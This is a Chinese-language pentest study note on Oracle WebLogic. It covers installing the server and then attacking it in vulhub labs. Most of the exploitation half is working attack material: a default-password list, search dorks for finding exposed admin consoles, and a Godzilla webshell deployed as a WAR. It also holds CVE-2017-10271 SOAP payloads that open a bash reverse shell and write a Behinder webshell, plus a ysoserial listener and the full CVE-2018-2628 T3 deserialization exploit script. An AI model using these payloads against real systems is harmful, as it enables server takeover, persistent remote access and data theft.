## Weblogic

### Weblogic**相关介绍**

#### Weblogic介绍

WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

http://www.oracle.com/index.html

https://www.oracle.com/middleware/technologies/weblogic-server-installers-downloads.html

#### Weblogic与Tomcat比较

| **Weblogic特点**                                             | **Tomcat特点**                                               |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| WLS全面支持J2EE的标准规范和其他标准规范,Web Service,  SSL, xml,EJB等 | Tomcat 为WEB容器，只支持部分J2EE标准,  应用局限性强,不支持EJB |
| 完善的售后支持                                               | 没有售后支持,  看社区与论坛                                  |
| 集群机制,  支持分布式的应用                                  | 需要结合第三方插件/应用                                      |
| Web控制台进行组件、JDBC、管理和配置                          | 差                                                           |
| 较好的支持热部署（开发模式下）                               | 差                                                           |
| 需要费用                                                     | 开源免费                                                     |

#### Weblogic特征

端口：`7001`

Web界面：`Error 404 -- Not Found`

#### Weblogic历史漏洞

> CVE-2017-10271 	CVE-2019-2725 	CVE-2020-2555
>
> CVE-2018-2628 	  CVE-2019-2729
>
> CVE-2018-2893 	  CVE-2019-2890 
>
> CVE-2018-2894 	  weblogic弱口令
>
> CVE-2018-3191 	  weblogic ssrf
>
> CVE-2018-3245 	 CVE-2020-2551
>
> CVE-2019-2618 	 CVE-2020-2883

### **Weblogic**安装部署

#### Linux安装Weblogic

把 `jdk` 和 `rpm` 文件上传到虚拟机文件夹下

> fmw_12.2.1.3.0_wls.jar
>
> jdk-8u181-linux-x64.rpm

##### 安装java

```bash
rpm -ivh jdk-8u181-linux-x64.rpm
```

![image-20240720142401695](../../../../repo/assets/image-20240720142401695.png)

`rpm` 主要功能是安装、卸载、升级和管理软件；组件查询功能；验证功能；软件包 GPG 和MD5 数字签名的导入、验证和发布；软件包依赖处理；选择安装；网络远程安装功能。

`ivh` 意思是软件包管理器的选项，其中 `i` 表示**安装**，`v` 表示**显示安装过程**，`h` 表示**显示进度**。

###### 环境变量

```
vim /etc/profile

export JAVA_HOME=/usr/java/jdk1.8.0_181-amd64
export PATH=$PATH:/usr/java/jdk1.8.0_181-amd64/bin
export CLASSPATH=.
```

![image-20240720142707894](../../../../repo/assets/image-20240720142707894.png)

```
source /etc/profile
```

###### 卸载openjdk

```
rpm -qa | grep jdk
```

![image-20240720143935174](../../../../repo/assets/image-20240720143935174.png)

```
rpm -e --nodeps java-1.8.0-openjdk-headless-1.8.0.262.b10-1.el7.x86_64 
rpm -e --nodeps java-1.7.0-openjdk-1.7.0.261-2.6.22.2.el7_8.x86_64 
rpm -e --nodeps java-1.7.0-openjdk-headless-1.7.0.261-2.6.22.2.el7_8.x86_64 
rpm -e --nodeps java-1.8.0-openjdk-1.8.0.262.b10-1.el7.x86_64
```

```
java -version
```

![image-20240720144014402](../../../../repo/assets/image-20240720144014402.png)

##### 安装Weblogic

###### 创建用户组、用户

```
groupadd weblogic
useradd -g weblogic -m -d /home/weblogic weblogic
chown -R weblogic:weblogic /home/weblogic 
chmod -R 777 /home/weblogic
passwd weblogic
```

![image-20240720144100529](../../../../repo/assets/image-20240720144100529.png)

> weblogic/123456

###### 上传安装包

上传安装包到`/home/weblogic`并授权

```
mv fmw_12.2.1.3.0_wls.jar /home/weblogic/fmw_12.2.1.3.0_wls.jar
chown weblogic:weblogic /home/weblogic/fmw_12.2.1.3.0_wls.jar
```

###### 创建目录并赋权

```
mkdir -p /opt/weblogic
chown -R weblogic:weblogic /opt/weblogic
chmod 777 /opt/weblogic

mkdir  /opt/weblogic/oraInventory
mkdir -p /opt/weblogic/Oracle/Middleware
chmod 777 /opt/weblogic/Oracle/Middleware

cd /opt/weblogic
```

![image-20240720144224954](../../../../repo/assets/image-20240720144224954.png)

![image-20240720144301552](../../../../repo/assets/image-20240720144301552.png)

1、`oraInst.loc`应答文本文件

```
vim /opt/weblogic/oraInst.loc

inventory_loc=/opt/weblogic/oraInventory
inst_group=weblogic
```

![image-20240720144505051](../../../../repo/assets/image-20240720144505051.png)

2、`wls.rsp`响应文件

```
vim /opt/weblogic/wls.rsp

[ENGINE]
Response File Version=1.0.0.0.0
[GENERIC]
ORACLE_HOME=/opt/weblogic/Oracle/Middleware
INSTALL_TYPE=WebLogic Server
DECLINE_SECURITY_UPDATES=true 
SECURITY_UPDATES_VIA_MYORACLESUPPORT=false
```

![image-20240720144527246](../../../../repo/assets/image-20240720144527246.png)

###### 开始安装

```
su - weblogic

java -jar /home/weblogic/fmw_12.2.1.3.0_wls.jar -silent -responseFile /opt/weblogic/wls.rsp -invPtrLoc /opt/weblogic/oraInst.loc
```

![image-20240720144415681](../../../../repo/assets/image-20240720144415681.png)

###### 创建域

```
su - root
vim /etc/profile

export MW_HOME=/opt/weblogic/Oracle/Middleware
```

![image-20240720143837242](../../../../repo/assets/image-20240720143837242.png)

```
source /etc/profile
```

创建默认域

```
/opt/weblogic/Oracle/Middleware/oracle_common/common/bin/commEnv.sh 
/opt/weblogic/Oracle/Middleware/wlserver/common/bin/wlst.sh
```

![image-20240720144821996](../../../../repo/assets/image-20240720144821996.png)

运行后进行如下操作

```
readTemplate('/opt/weblogic/Oracle/Middleware/wlserver/common/templates/wls/wls.jar') 
cd('Servers/AdminServer') 
set('ListenAddress','') 
set('ListenPort',7001) 
cd('../../') 
cd('Security/base_domain/User/weblogic')
cmo.setPassword('wasjweblogic123') 
setOption('OverwriteDomain','true') 
writeDomain('/opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain') 
closeTemplate() 
exit() 
```

![image-20240720144906502](../../../../repo/assets/image-20240720144906502.png)

> 192.168.70.14:7001
>
> weblogic
>
> wasjweblogic123

###### 启动

```
cd /opt/weblogic/Oracle/Middleware/user_projects/domains/base_domain/bin
#./startWebLogic.sh
nohup ./startWebLogic.sh & tail -f nohup.out
```

![image-20240720145000152](../../../../repo/assets/image-20240720145000152.png)

访问：http://192.168.70.14:7001/console

![image-20240720112053730](../../../../repo/assets/image-20240720112053730.png)

```
weblogic
wasjweblogic123
```

![image-20240720112343735](../../../../repo/assets/image-20240720112343735.png)

![image-20240720112206824](../../../../repo/assets/image-20240720112206824.png)

或者

```
source /opt/weblogic/Oracle/Middleware/wlserver/server/bin/setWLSEnv.sh
mkdir -p /opt/weblogic/Oracle/Middleware/user_projects/domains/hnDoMain
cd /opt/weblogic/Oracle/Middleware/user_projects/domains/hnDoMain
$JAVA_HOME/bin/java $JAVA_OPTIONS -Xmx1024m -XX:MaxPermSize=2048m weblogic.Server
```



> 1、访问控制台：
>
> http://192.168.70.14:7001/console
>
> 2、启动weblogic：
>
> ```
> cd /opt/weblogic/Oracle/Middleware/user_projects/domains/hnDoMain
> ./startWebLogic.sh
> ```
>
> 3、停止weblogic：
>
> ```
> ./stopWeblogic.sh
> ```
>
> 或者
>
> ```
> ps -ef | grep weblogic
> kill -9
> ```
>
> 4、后台启动使用：
>
> ```
> nohup ./startWebLogic.sh &
> ```



#### Windows安装Weblogic

##### java环境变量

```
JAVA_HOME=C:\environment\Java\jdk1.8.0_131

PATH:
%JAVA_HOME%\bin
%JAVA_HOME%\jre\bin
```

![image-20240720153807354](../../../../repo/assets/image-20240720153807354.png)

```
java -version
```

![image-20240720153654752](../../../../repo/assets/image-20240720153654752.png)

##### 安装

以管理员权限运行

```
C:\file\weblogic\fmw_12.2.1.4.0_wls\Disk1\install\.ng.cmd
```

![image-20240720154252640](../../../../repo/assets/image-20240720154252640.png)

![image-20240720154324320](../../../../repo/assets/image-20240720154324320.png)

![image-20240720154512892](../../../../repo/assets/image-20240720154512892.png)

![image-20240720154605256](../../../../repo/assets/image-20240720154605256.png)

![image-20240720155610144](../../../../repo/assets/image-20240720155610144.png)

![image-20240720155627641](../../../../repo/assets/image-20240720155627641.png)

###### 新建域

![image-20240720155906592](../../../../repo/assets/image-20240720155906592.png)

![image-20240720160125389](../../../../repo/assets/image-20240720160125389.png)

![image-20240720160301109](../../../../repo/assets/image-20240720160301109.png)

> weblogic
>
> wasjweblogic123

![image-20240720160402128](../../../../repo/assets/image-20240720160402128.png)

![image-20240720162312538](../../../../repo/assets/image-20240720162312538.png)

![image-20240720162336004](../../../../repo/assets/image-20240720162336004.png)

> port:7001

![image-20240720162449076](../../../../repo/assets/image-20240720162449076.png)

![image-20240720162527368](../../../../repo/assets/image-20240720162527368.png)

##### 启动weblogic

```
C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\startWeblogic.cmd
```

![image-20240720162611998](../../../../repo/assets/image-20240720162611998.png)

http://192.168.70.10:7001

![image-20240720162717578](../../../../repo/assets/image-20240720162717578.png)

http://192.168.70.10:7001/console/login/LoginForm.jsp

![image-20240720162909807](../../../../repo/assets/image-20240720162909807.png)

```
weblogic
wasjweblogic123
```

![image-20240720163114503](../../../../repo/assets/image-20240720163114503.png)



##### 上传war包

![image-20240720163004310](../../../../repo/assets/image-20240720163004310.png)

![image-20240720163253255](../../../../repo/assets/image-20240720163253255.png)

![image-20240720163359915](../../../../repo/assets/image-20240720163359915.png)

![image-20240720163511714](../../../../repo/assets/image-20240720163511714.png)

访问：http://192.168.70.10:7001/jobfan/2010.jsp

![image-20240720164828973](../../../../repo/assets/image-20240720164828973.png)

> 密码：`xxxxxx`

![image-20240720164927682](../../../../repo/assets/image-20240720164927682.png)

#### Windows部署structs2

### Weblogic漏洞检测

#### 1.WeblogicScan

https://github.com/rabbitmask/WeblogicScan

```
pip install -r requirements.txt
python WeblogicScan.py -u 192.168.70.10 -p 7001
python WeblogicScan.py -f target.txt
```

![image-20240720165842592](../../../../repo/assets/image-20240720165842592.png)

#### 2.weblogicScanner

https://github.com/0xn0ne/weblogicScanner

```
python ws.py -t 192.168.70.10:7001
```

![image-20240720170534962](../../../../repo/assets/image-20240720170534962.png)

#### 3.Java反序列化漏洞

```
java -jar Java反序列化漏洞利用工具V1.7.jar
```

![image-20240720171945183](../../../../repo/assets/image-20240720171945183.png)

![image-20240720172227335](../../../../repo/assets/image-20240720172227335.png)

#### 4.weblogic_exploit

```
java -jar weblogic_exploit-1.0-SNAPSHOT-all.jar
```

![image-20240720172610001](../../../../repo/assets/image-20240720172610001.png)

#### 5.WeblogicTool

```
java -jar WeblogicTool_1.3.jar
```

![image-20240720173028990](../../../../repo/assets/image-20240720173028990.png)

### **Weblogic**漏洞利用

#### 获取资产

`shodan` ，`fofa` ，**钟馗之眼**等等

##### fofa

https://fofa.info/

```
app="BEA-WebLogic-Server"
```

![image-20240720185936521](../../../../repo/assets/image-20240720185936521.png)

#### google hacking

`inurl`:漏洞地址

`intitle`:`weblogic`等

```
inurl:/console/login/LoginForm.jsp intitle:Oracle WebLogic Server intext:Version:12.2.1.3.0
```

![image-20240720190125565](../../../../repo/assets/image-20240720190125565.png)

![image-20240720190150892](../../../../repo/assets/image-20240720190150892.png)

> site:baidu.com intext:管理|后台|登录|登陆|用户名|密码|系统|账号|login|system|admin
>
> inurl:edu.cn intitle:管理
>
> site:baidu.com inurl:login|inurl:admin|inurl:admin_login|inurl:system
>
> site:baidu.com intitle:管理|后台|后台管理|登录|登陆
>
> inurl:login|admin|admin_login|login_admin|system|user
>
> site:baidu.com
>
> site:baidu.com intext:管理|后台|登录|用户名|密码|验证码|系统|admin|login|username|password

![image-20240720190902456](../../../../repo/assets/image-20240720190902456.png)

![image-20240720190722939](../../../../repo/assets/image-20240720190722939.png)

![image-20240720190957232](../../../../repo/assets/image-20240720190957232.png)

![image-20240720191043492](../../../../repo/assets/image-20240720191043492.png)

![image-20240720191139691](../../../../repo/assets/image-20240720191139691.png)

![image-20240720191549649](../../../../repo/assets/image-20240720191549649.png)

![image-20240720191622372](../../../../repo/assets/image-20240720191622372.png)

#### vulhub靶场

### Weblogic漏洞利用-弱口令

#### 常用弱口令

```
system / password
weblogic / weblogic
weblogic / Oracle@123
admin / admin
joe / password
mary / password
system / security
wlcsystem / wlcsystem
wlpisystem / wlpisystem
```

#### 启动

```
cd /root/vulhub/weblogic/weak_password
docker-compose up -d
docker ps -s
```

![image-20240723165807689](../../../../repo/assets/image-20240723165807689.png)

http://192.168.3.67:7001/console/login/LoginForm.jsp

![image-20240723152825741](../../../../repo/assets/image-20240723152825741.png)

#### 弱口令

```
weblogic 
Oracle@123
```

![image-20240723152848582](../../../../repo/assets/image-20240723152848582.png)

#### 上传war包

##### 哥斯拉生成shell.jsp

![image-20240724104523165](../../../../repo/assets/image-20240724104523165.png)

> 密码：passwd

![image-20240724091925232](../../../../repo/assets/image-20240724091925232.png)

##### 打包为war包

```
jar -cvf shell.war shell.jsp
```

![image-20240723153809002](../../../../repo/assets/image-20240723153809002.png)

##### 部署上传

![image-20240723153718423](../../../../repo/assets/image-20240723153718423.png)

![image-20240723153914574](../../../../repo/assets/image-20240723153914574.png)

![image-20240723153948529](../../../../repo/assets/image-20240723153948529.png)

![image-20240723154018078](../../../../repo/assets/image-20240723154018078.png)

![image-20240723154041255](../../../../repo/assets/image-20240723154041255.png)

![image-20240723154146687](../../../../repo/assets/image-20240723154146687.png)

http://192.168.3.67:7001/shell/shell.jsp

![image-20240723154300697](../../../../repo/assets/image-20240723154300697.png)

#### 哥斯拉连接

```
http://192.168.3.67:7001/shell/shell.jsp
passwd
```

![image-20240723154443610](../../../../repo/assets/image-20240723154443610.png)

![image-20240724093820777](../../../../repo/assets/image-20240724093820777.png)

### Weblogic漏洞利用-CVE-2017-10271

#### 拼接URL

```
/wls-wsat/CoordinatorPortType
/wls-wsat/RegistrationPortTypeRPC
/wls-wsat/ParticipantPortType
/wls-wsat/RegistrationRequesterPortType
/wls-wsat/CoordinatorPortType11
/wls-wsat/RegistrationPortTypeRPC11
/wls-wsat/ParticipantPortType11
/wls-wsat/RegistrationRequesterPortType11
```

#### 启动

```
cd /root/vulhub/weblogic/CVE-2017-10271
docker-compose up -d
docker ps -s
```

![image-20240724105643393](../../../../repo/assets/image-20240724105643393.png)

访问http://192.168.70.14:7001/console/login/LoginForm.jsp

![image-20240724111520669](../../../../repo/assets/image-20240724111520669.png)

#### 拼接url

http://192.168.70.14:7001/wls-wsat/CoordinatorPortType 

![image-20240724143402490](../../../../repo/assets/image-20240724143402490.png)

#### burpsuite抓包

![image-20240724144939411](../../../../repo/assets/image-20240724144939411.png)

修改请求方法为POST ,

添加文件类型是text/xml,

```
POST /wls-wsat/CoordinatorPortType  HTTP/1.1
Host: 192.168.70.14:7001
Content-Type: text/xml
```

设置文反弹连接内容

> bash -i >& /dev/tcp/192.168.70.4/1234 0>&1
>
> bash -i &gt;&amp; /dev/tcp/10.0.0.1/21 0&gt;&amp;1

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.70.14:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 637

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header>
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
<java version="1.4.0" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="3">
<void index="0">
<string>/bin/bash</string>
</void>
<void index="1">
<string>-c</string>
</void>
<void index="2">
<string>bash -i &gt;&amp; /dev/tcp/192.168.70.4/1234 0&gt;&amp;1</string>
</void>
</array>
<void method="start"/></void>
</java>
</work:WorkContext>
</soapenv:Header>
<soapenv:Body/>
</soapenv:Envelope>
```



#### kali监听端口

kali监听1234端口

```
nc -lnvp 1234
```

![image-20240724112857636](../../../../repo/assets/image-20240724112857636.png)

#### 发包

![image-20240724144417269](../../../../repo/assets/image-20240724144417269.png)

#### 反弹shell成功

![image-20240724144454458](../../../../repo/assets/image-20240724144454458.png)

进入根目录

```
cd /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war
```

![image-20240724145619342](../../../../repo/assets/image-20240724145619342.png)

#### 写入webshell

##### 测试路径是否可上传

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.70.14:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 638

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
    <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><java version="1.4.0" class="java.beans.XMLDecoder">
    <object class="java.io.PrintWriter"> 
    <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string>
    <void method="println"><string>
    <![CDATA[
<% out.print("test"); %>
    ]]>
    </string>
    </void>
    <void method="close"/>
    </object></java></java>
    </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body/>
</soapenv:Envelope>
```

![image-20240724150322538](../../../../repo/assets/image-20240724150322538.png)

![image-20240724150345294](../../../../repo/assets/image-20240724150345294.png)

访问http://192.168.70.14:7001/bea_wls_internal/test.jsp

![image-20240724150427610](../../../../repo/assets/image-20240724150427610.png)

##### 写入冰蝎webshell

```xml
POST /wls-wsat/CoordinatorPortType HTTP/1.1
Host: 192.168.70.14:7001
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: text/xml
Content-Length: 1161

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
     <soapenv:Header>
     <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
     <java><java version="1.4.0" class="java.beans.XMLDecoder">
     <object class="java.io.PrintWriter">      <string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/shell.jsp</string>
     <void method="println"><string>
     <![CDATA[
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
     ]]>
     </string>
     </void>
     <void method="close"/>
     </object></java></java>
     </work:WorkContext>
     </soapenv:Header>
     <soapenv:Body/>
</soapenv:Envelope>
```

![image-20240724150843927](../../../../repo/assets/image-20240724150843927.png)

![image-20240724150903337](../../../../repo/assets/image-20240724150903337.png)

http://192.168.70.14:7001/bea_wls_internal/shell.jsp

![image-20240724152237558](../../../../repo/assets/image-20240724152237558.png)

#### 冰蝎连接

```
http://192.168.70.14:7001/bea_wls_internal/shell.jsp
rebeyond
```

![image-20240724154338931](../../../../repo/assets/image-20240724154338931.png)

![image-20240724154230431](../../../../repo/assets/image-20240724154230431.png)

### Weblogic漏洞利用-CVE-2018-2628

#### 漏洞原理

Weblogic Server中的RMI 通信使用**T3协议**在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机. T3协议在开放WebLogic控制台端口的应用上默认开启.

攻击者利用其他rmi绕过weblogic黑名单限制，然后在将加载的内容利用readObject解析，从而造成**反序列化**远程代码执行该漏洞，该漏洞主要由于T3服务触发，所有开放weblogic控制台7001端口，默认会开启T3服务，攻击者发送构造好的T3协议数据，就可以获取目标服务器的权限。

#### 启动

```
cd /root/vulhub/weblogic/CVE-2018-2628
docker-compose up -d
docker ps -s
```

![image-20240724160425910](../../../../repo/assets/image-20240724160425910.png)

访问http://192.168.70.14:7001/console/login/LoginForm.jsp

![image-20240724160527703](../../../../repo/assets/image-20240724160527703.png)

WebLogic Server 版本: 10.3.6.0

```docker
docker run -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```



#### 下载ysoserial

```bash
wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
```

##### 运行ysoserial

```java
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]

java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 192.168.70.4 4040'
```

#### 下载exploit.py

https://www.exploit-db.com/exploits/44553

```python
# -*- coding: utf-8 -*-
# Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)
#
# IMPORTANT: Is provided only for educational or information purposes.
#
# Credit: Thanks by Liao Xinxi of NSFOCUS Security Team
# Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA
#
# How to exploit:
# 1. run below command on JRMPListener host
#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]
#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 'nc -nv 10.0.0.5 4040'
# 2. start a listener on attacker host
#    e.g. nc -nlvp 4040
# 3. run this script on attacker host
#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar
#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]
#       e.g.
#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)
#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)

from __future__ import print_function

import binascii
import os
import socket
import sys
import time


def generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    #generates ysoserial payload
    command = 'java -jar {} {} {}:{} > payload.out'.format(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)
    print("command: " + command)
    os.system(command)
    bin_file = open('payload.out','rb').read()
    return binascii.hexlify(bin_file)


def t3_handshake(sock, server_addr):
    sock.connect(server_addr)
    sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex'))
    time.sleep(1)
    sock.recv(1024)
    print('handshake successful')


def build_t3_request_object(sock, port):
    data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371'
    data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport))
    data3 = '1a7727000d3234322e323134'
    data4 = '2e312e32353461863d1d0000000078'
    for d in [data1,data2,data3,data4]:
        sock.send(d.decode('hex'))
    time.sleep(2)
    print('send request payload successful,recv length:%d'%(len(sock.recv(2048))))


def send_payload_objdata(sock, data):
    payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
    payload+=data
    payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
    payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload)
    sock.send(payload.decode('hex'))
    time.sleep(2)
    sock.send(payload.decode('hex'))
    res = ''
    try:
        while True:
            res += sock.recv(4096)
            time.sleep(0.1)
    except Exception:
        pass
    return res


def exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(65)
    server_addr = (dip, dport)
    t3_handshake(sock, server_addr)
    build_t3_request_object(sock, dport)
    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
    print("payload: " + payload)
    rs=send_payload_objdata(sock, payload)
    print('response: ' + rs)
    print('exploit completed!')


if __name__=="__main__":
    #check for args, print usage if incorrect
    if len(sys.argv) != 7:
        print('\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] '
              '[JRMPListener ip] [JRMPListener port] [JRMPClient]\n')
        sys.exit()

    dip = sys.argv[1]
    dport = int(sys.argv[2])
    path_ysoserial = sys.argv[3]
    jrmp_listener_ip = sys.argv[4]
    jrmp_listener_port = sys.argv[5]
    jrmp_client = sys.argv[6]
    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)
```

##### 运行exploit.py

```python
python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]

chmod +x exploit.py
python exploit.py 192.168.70.14 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.70.4 1099 JRMPClient
```



`[victim ip]`和`[victim port]`是目标weblogic的IP和端口，

`[path to ysoserial]`是本地ysoserial的路径，

`[JRMPListener ip]`和`[JRMPListener port]`第一步中启动JRMP Server的IP地址和端口。

`[JRMPClient]`是执行JRMPClient的类，可选的值是`JRMPClient`或`JRMPClient2`。



